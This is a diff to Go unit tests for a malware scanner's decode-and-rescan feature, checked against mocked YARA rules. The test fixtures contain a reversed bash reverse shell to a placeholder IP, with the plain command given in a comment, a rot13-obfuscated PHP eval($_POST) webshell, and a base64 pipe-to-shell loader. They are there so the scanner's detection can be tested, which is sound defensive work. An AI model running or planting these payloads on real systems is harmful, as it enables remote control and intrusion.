@@ -11,6 +11,7 @@ import (
 	"aether/internal/config"
 	"aether/internal/report"
 	"aether/internal/scanner"
+	"aether/internal/yara"
 )
 
 func gzipCompress(data []byte) []byte {
@@ -134,5 +135,88 @@ func TestDecodeAndRescan_ContextCancellation(t *testing.T) {
 	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/test.sh", []byte(b64Encoded), nil, cfg, nil)
 	if match != nil || layers != nil {
 		t.Fatalf("expected nil when context is canceled, got %v", match)
+	}
+}
+
+func TestDecodeAndRescan_RevEcho(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+	ctx := context.Background()
+
+	// Reversed interactive bash reverse shell:
+	// "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" backwards is:
+	// "1&>0 4444/1.0.0.01/pct/ved/ &> i- hsab"
+	scriptContent := []byte("#!/bin/sh\necho '1&>0 4444/1.0.0.01/pct/ved/ &> i- hsab' | rev | bash\n")
+
+	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/rev_evasion.sh", scriptContent, nil, cfg, nil)
+	if match == nil {
+		t.Fatalf("expected Script_Obfuscated_Payload match for reversed bash reverse shell")
+	}
+	if len(layers) == 0 || layers[0] != "rev" {
+		t.Errorf("expected layers to start with rev, got %v", layers)
+	}
+	if match.Severity != report.SeverityAlert {
+		t.Errorf("expected ALERT severity, got %s", match.Severity)
+	}
+}
+
+func TestDecodeAndRescan_Rot13Webshell(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+	ctx := context.Background()
+
+	// str_rot13("eval($_POST['cmd']);") -> "riny($_CBFG['pzq']);"
+	phpScript := []byte("<?php\n$code = str_rot13('riny($_CBFG[\"pzq\"]);');\neval($code);\n?>\n")
+
+	match, layers := scanner.DecodeAndRescan(ctx, "/var/www/html/rot.php", phpScript, nil, cfg, nil)
+	if match == nil {
+		t.Fatalf("expected Script_Obfuscated_Payload match for rot13 webshell")
+	}
+	if len(layers) == 0 || layers[0] != "rot13" {
+		t.Errorf("expected layers to start with rot13, got %v", layers)
+	}
+}
+
+type mockYaraScannerForDecode struct {
+	targetMatched bool
+}
+
+func (m *mockYaraScannerForDecode) Scan(target yara.ScanTarget) ([]yara.RuleMatch, error) {
+	if bytes.Contains(target.Data, []byte("SPECIAL_MALICIOUS_IMPLANT_TOKEN")) {
+		m.targetMatched = true
+		return []yara.RuleMatch{
+			{
+				RuleName: "Linux_Implant_Custom_Family",
+				Severity: report.SeverityAlert,
+				Score:    90,
+			},
+		}, nil
+	}
+	return nil, nil
+}
+
+func (m *mockYaraScannerForDecode) Destroy() {}
+
+func TestDecodeAndRescanWithYARA(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+	ctx := context.Background()
+
+	// Payload with special YARA implant token encoded in base64
+	implantPayload := "#!/bin/sh\nexport TOKEN=SPECIAL_MALICIOUS_IMPLANT_TOKEN\n"
+	b64Encoded := base64.StdEncoding.EncodeToString([]byte(implantPayload))
+	scriptContent := []byte(fmt.Sprintf("#!/bin/sh\necho '%s' | base64 -d | sh\n", b64Encoded))
+
+	mockY := &mockYaraScannerForDecode{}
+	match, layers, yMatches := scanner.DecodeAndRescanWithYARA(ctx, "/tmp/implant.sh", scriptContent, nil, cfg, nil, mockY)
+
+	if match == nil {
+		t.Fatalf("expected match for base64 encoded YARA target")
+	}
+	if len(layers) == 0 || layers[0] != "base64" {
+		t.Errorf("expected layers to start with base64, got %v", layers)
+	}
+	if !mockY.targetMatched {
+		t.Errorf("expected YARA scanner to have scanned and matched the decoded payload buffer")
+	}
+	if len(yMatches) == 0 || yMatches[0].RuleName != "Linux_Implant_Custom_Family" {
+		t.Errorf("expected YARA match Linux_Implant_Custom_Family, got %v", yMatches)
 	}
 }
